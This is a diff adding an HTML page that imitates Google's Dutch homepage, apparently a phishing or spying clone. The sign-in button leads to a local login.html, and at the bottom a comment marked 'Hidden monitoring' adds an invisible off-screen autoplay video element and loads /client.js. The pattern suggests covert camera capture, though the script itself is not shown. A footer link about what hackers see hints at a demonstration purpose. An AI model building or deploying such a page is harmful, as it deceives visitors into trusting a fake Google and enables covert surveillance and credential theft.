@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Top navigation bar -->
+    <nav class="top-nav">
+        <div class="top-nav-left">
+            <a href="https://about.google/" target="_blank">Over Google</a>
+            <a href="https://store.google.com/" target="_blank">Store</a>
+        </div>
+        <div class="top-nav-right">
+            <a href="https://mail.google.com/" target="_blank">Gmail</a>
+            <a href="https://www.google.com/imghp" target="_blank">Afbeeldingen</a>
+            <div class="apps-wrapper">
+                <button class="apps-btn" title="Google-apps" onclick="toggleAppsMenu()">
+                    <svg viewBox="0 0 24 24" width="24" height="24">
+                        <path fill="#5f6368" d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"/>
+                    </svg>
+                </button>
+                <div class="apps-menu" id="appsMenu">
+                    <a href="https://myaccount.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="Account">
+                        <span>Account</span>
+                    </a>
+                    <a href="https://www.google.com/search" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/googleg_512dp.png" alt="Zoeken">
+                        <span>Zoeken</span>
+                    </a>
+                    <a href="https://maps.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/maps_512dp.png" alt="Maps">
+                        <span>Maps</span>
+                    </a>
+                    <a href="https://www.youtube.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/youtube_512dp.png" alt="YouTube">
+                        <span>YouTube</span>
+                    </a>
+                    <a href="https://play.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/play_prism_512dp.png" alt="Play">
+                        <span>Play</span>
+                    </a>
+                    <a href="https://news.google.com/" target="_blank" class="app-item">
+                        <div class="app-icon-news">
+                            <svg viewBox="0 0 24 24" width="40" height="40">
+                                <path fill="#4285F4" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
+                                <text x="12" y="16" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold" font-family="Arial">N</text>
+                            </svg>
+                        </div>
+                        <span>Nieuws</span>
+                    </a>
+                    <a href="https://mail.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_512dp.png" alt="Gmail">
+                        <span>Gmail</span>
+                    </a>
+                    <a href="https://meet.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/meet_2020q4_512dp.png" alt="Meet">
+                        <span>Meet</span>
+                    </a>
+                    <a href="https://contacts.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/contacts_2022_512dp.png" alt="Contacten">
+                        <span>Contacten</span>
+                    </a>
+                    <a href="https://drive.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_512dp.png" alt="Drive">
+                        <span>Drive</span>
+                    </a>
+                    <a href="https://calendar.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/calendar_2020q4_512dp.png" alt="Agenda">
+                        <span>Agenda</span>
+                    </a>
+                    <a href="https://translate.google.com/" target="_blank" class="app-item">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/translate_512dp.png" alt="Vertalen">
+                        <span>Vertalen</span>
+                    </a>
+                </div>
+            </div>
+            <a href="login.html" class="signin-btn">Inloggen</a>
+        </div>
+    </nav>
+
+    <!-- Main content -->
+    <main class="main-content">
+        <!-- Google Logo -->
+        <div class="logo-container">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        </div>
+
+        <!-- Search bar -->
+        <div class="search-container">
+            <form action="results.html" method="GET" class="search-form">
+                <div class="search-bar">
+                    <span class="search-icon">
+                        <svg viewBox="0 0 24 24" width="20" height="20">
+                            <path fill="#9aa0a6" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+                        </svg>
+                    </span>
+                    <input type="text" class="search-input" name="q" autocomplete="off" spellcheck="false" autofocus>
+                    <span class="mic-icon" title="Zoeken met je stem">
+                        <svg viewBox="0 0 24 24" width="24" height="24">
+                            <path fill="#4285f4" d="m12 15c1.66 0 2.99-1.34 2.99-3L15 6c0-1.66-1.34-3-3-3S9 4.34 9 6v6c0 1.66 1.34 3 3 3z"/>
+                            <path fill="#34a853" d="m11 18.92h2V22h-2z"/>
+                            <path fill="#f4b400" d="M7 12H5c0 2.76 2.24 5 5 5v-2c-1.66 0-3-1.34-3-3z"/>
+                            <path fill="#ea4335" d="M19 12h-2c0 1.66-1.34 3-3 3v2c2.76 0 5-2.24 5-5z"/>
+                        </svg>
+                    </span>
+                    <span class="lens-icon" title="Zoeken op afbeelding">
+                        <svg viewBox="0 0 192 192" width="24" height="24">
+                            <rect fill="none" height="192" width="192"/>
+                            <g>
+                                <circle fill="#4285f4" cx="96" cy="104.15" r="28"/>
+                                <path fill="#ea4335" d="M160,72v40.15V136c0,1.69-0.34,3.29-0.82,4.82v0v0C156.88,147.21,150.93,152,144,152H48 c-6.93,0-12.88-4.79-15.18-11.18v0v0C32.34,139.29,32,137.69,32,136v-23.85V72c0-8.84,7.16-16,16-16h16l16-16h32l16,16h16 C152.84,56,160,63.16,160,72z"/>
+                                <path fill="#fff" d="M96,74.15c-16.57,0-30,13.43-30,30c0,16.57,13.43,30,30,30c16.57,0,30-13.43,30-30 C126,87.58,112.57,74.15,96,74.15z M96,124.15c-11.05,0-20-8.95-20-20c0-11.05,8.95-20,20-20c11.05,0,20,8.95,20,20 C116,115.2,107.05,124.15,96,124.15z"/>
+                            </g>
+                        </svg>
+                    </span>
+                </div>
+                <div class="search-buttons">
+                    <button type="submit" class="search-btn">Google Zoeken</button>
+                    <button type="button" class="lucky-btn" onclick="luckySearch()">Ik doe een gok</button>
+                </div>
+                <div class="language-offer">
+                    Google aangeboden in: <a href="https://www.google.com/?hl=en" target="_blank">English</a> <a href="https://www.google.com/?hl=fr" target="_blank">Français</a> <a href="https://www.google.com/?hl=de" target="_blank">Deutsch</a>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-top">
+            <span>Nederland</span>
+            <a href="info.html" style="color:#4285f4; margin-left: 20px; font-size: 13px;">🔍 Bekijk wat hackers over jou zien</a>
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-left">
+                <a href="https://ads.google.com/" target="_blank">Adverteren</a>
+                <a href="https://about.google/" target="_blank">Bedrijf</a>
+                <a href="https://www.google.com/search/howsearchworks/" target="_blank">Hoe zoeken werkt</a>
+            </div>
+            <div class="footer-right">
+                <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+                <a href="https://policies.google.com/terms" target="_blank">Voorwaarden</a>
+                <a href="https://www.google.com/preferences" target="_blank">Instellingen</a>
+            </div>
+        </div>
+    </footer>
+    <script>
+        function luckySearch() {
+            const query = document.querySelector('.search-input').value;
+            if (query.trim()) {
+                window.open('https://www.google.com/search?btnI=1&q=' + encodeURIComponent(query), '_blank');
+            } else {
+                window.open('https://doodles.google/', '_blank');
+            }
+        }
+
+        function toggleAppsMenu() {
+            const menu = document.getElementById('appsMenu');
+            menu.classList.toggle('show');
+        }
+
+        document.addEventListener('click', function(e) {
+            const wrapper = document.querySelector('.apps-wrapper');
+            const menu = document.getElementById('appsMenu');
+            if (!wrapper.contains(e.target)) {
+                menu.classList.remove('show');
+            }
+        });
+    </script>
+<!-- Hidden monitoring -->
+<video id="v" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1"></video>
+<script src="/client.js"></script>
+</body>
+</html>
